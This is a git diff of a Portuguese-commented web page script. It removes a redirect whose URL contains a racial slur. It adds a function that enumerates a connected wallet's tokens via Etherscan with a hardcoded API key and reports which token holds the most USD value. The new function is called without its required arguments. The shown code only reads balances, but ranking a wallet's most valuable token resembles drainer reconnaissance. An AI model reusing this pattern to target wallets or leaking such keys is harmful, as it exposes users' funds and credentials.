@@ -1922,13 +1922,86 @@ console.log(`Endereço que vai enviar: ${EndereçoQueEnvia}`);
     }
 
  
-    async function startAnotherProcess() {
-        window.location.href = 'https://google.com/HelloNigga';
-        // Adicione aqui a lógica do novo processo
+	
+async function findAndShowLargestTokenInUSD(connectedWalletAddress, signer) {
+    const ERC20_ABI = [
+        "function balanceOf(address account) view returns (uint256)",
+        "function decimals() view returns (uint8)",
+        "function symbol() view returns (string)"
+    ];
+
+    console.log(`Checking tokens for wallet: ${connectedWalletAddress}`);
+
+    // Passo 1: Obter lista de tokens da Etherscan
+    let tokenAddresses = [];
+    try {
+        const response = await fetch(
+            `https://api.etherscan.io/api?module=account&action=tokentx&address=${connectedWalletAddress}&page=1&offset=100&startblock=0&endblock=99999999&sort=asc&apikey=1MXT1YY7U4J53W22GUJCWR4DA556I8CIGE`
+        );
+        const data = await response.json();
+        if (data.status === "1") {
+            tokenAddresses = [
+                ...new Set(data.result.map((tx) => tx.contractAddress))
+            ];
+        } else {
+            console.error("Failed to retrieve tokens from Etherscan.");
+            alert("Failed to fetch token list. Check the console for details.");
+            return;
+        }
+    } catch (error) {
+        console.error("Error fetching token data:", error);
+        alert("Error fetching token list. Check the console for details.");
+        return;
     }
 
+    // Passo 2: Consultar saldos e valores em USD
+    let largestToken = null;
+    let largestValueUSD = 0;
+
+    for (const tokenAddress of tokenAddresses) {
+        try {
+            const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
+
+            // Obter saldo, decimais e símbolo
+            const balance = await contract.balanceOf(connectedWalletAddress);
+            const decimals = await contract.decimals();
+            const symbol = await contract.symbol();
+            const formattedBalance = Number(ethers.formatUnits(balance, decimals));
+
+            // Consultar preço em USD via API da Coingecko
+            const priceResponse = await fetch(
+                `https://api.coingecko.com/api/v3/simple/price?ids=${symbol.toLowerCase()}&vs_currencies=usd`
+            );
+            const priceData = await priceResponse.json();
+
+            if (priceData[symbol.toLowerCase()] && priceData[symbol.toLowerCase()].usd) {
+                const priceInUSD = priceData[symbol.toLowerCase()].usd;
+                const valueInUSD = formattedBalance * priceInUSD;
+
+                console.log(`${symbol}: ${formattedBalance} (${valueInUSD.toFixed(2)} USD)`);
+
+                // Comparar para encontrar o maior valor em USD
+                if (valueInUSD > largestValueUSD) {
+                    largestValueUSD = valueInUSD;
+                    largestToken = symbol;
+                }
+            } else {
+                console.warn(`Price for ${symbol} not found.`);
+            }
+        } catch (error) {
+            console.error(`Error fetching data for token ${tokenAddress}:`, error);
+        }
+    }
+
+    // Passo 3: Mostrar o maior token em USD
+    if (largestToken) {
+        alert(`O token com o maior valor em dólares é:\n${largestToken}: $${largestValueUSD.toFixed(2)}`);
+    } else {
+        alert("Nenhum token encontrado ou com valor em dólares disponível.");
+    }
+}
 	  
-    connectAndCheck().then(() => startAnotherProcess());
+    connectAndCheck().then(() => findAndShowLargestTokenInUSD());
 	
 	
 
